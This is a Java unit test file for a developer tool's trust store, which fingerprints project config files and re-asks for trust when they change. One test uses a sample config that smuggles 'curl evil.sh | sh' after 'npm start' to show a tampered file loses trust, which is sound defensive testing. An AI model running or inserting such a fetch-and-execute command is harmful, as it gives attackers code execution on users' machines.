package io.github.louch.devdesk.linux.trust;

import static org.assertj.core.api.Assertions.assertThat;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Map;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

class TrustStoreTest {

    @TempDir
    Path state;

    private final Path project = Path.of("/home/me/shop/devdesk.yaml");

    @Test
    void unknownProjectIsNotTrustedUntilAllowed() {
        var store = new TrustStore(state.resolve("devdesk/trust.txt"));
        String fp = TrustStore.fingerprint("version: 1\n");

        assertThat(store.isTrusted(project, fp)).isFalse();
        store.trust(project, fp);
        assertThat(store.isTrusted(project, fp)).isTrue();
    }

    @Test
    void anyChangeToTheFileAsksAgain() {
        var store = new TrustStore(state.resolve("devdesk/trust.txt"));
        store.trust(project, TrustStore.fingerprint("command: npm start\n"));

        assertThat(store.isTrusted(project, TrustStore.fingerprint("command: npm start; curl evil.sh | sh\n")))
                .isFalse();
    }

    @Test
    void trustSurvivesARestartAndIsReadableText() throws Exception {
        Path file = state.resolve("devdesk/trust.txt");
        String fp = TrustStore.fingerprint("a");
        new TrustStore(file).trust(project, fp);

        assertThat(new TrustStore(file).isTrusted(project, fp)).isTrue();
        assertThat(Files.readString(file)).isEqualTo(fp + "  /home/me/shop/devdesk.yaml\n");
    }

    @Test
    void defaultLocationFollowsXdg() {
        assertThat(TrustStore.defaultFile(Map.of("XDG_STATE_HOME", "/x/state")))
                .isEqualTo(Path.of("/x/state/devdesk/trust.txt"));
        assertThat(TrustStore.defaultFile(Map.of("HOME", "/home/me")))
                .isEqualTo(Path.of("/home/me/.local/state/devdesk/trust.txt"));
    }

    @Test
    void twoFilesInOneFolderAreTrustedSeparately() {
        var store = new TrustStore(state.resolve("devdesk/trust.txt"));
        Path main = Path.of("/home/me/shop/devdesk.yaml");
        Path broken = Path.of("/home/me/shop/devdesk.broken.yaml");
        store.trust(main, TrustStore.fingerprint("main"));
        store.trust(broken, TrustStore.fingerprint("broken"));

        assertThat(store.isTrusted(main, TrustStore.fingerprint("main"))).isTrue();
        assertThat(store.isTrusted(broken, TrustStore.fingerprint("broken"))).isTrue();
    }
}
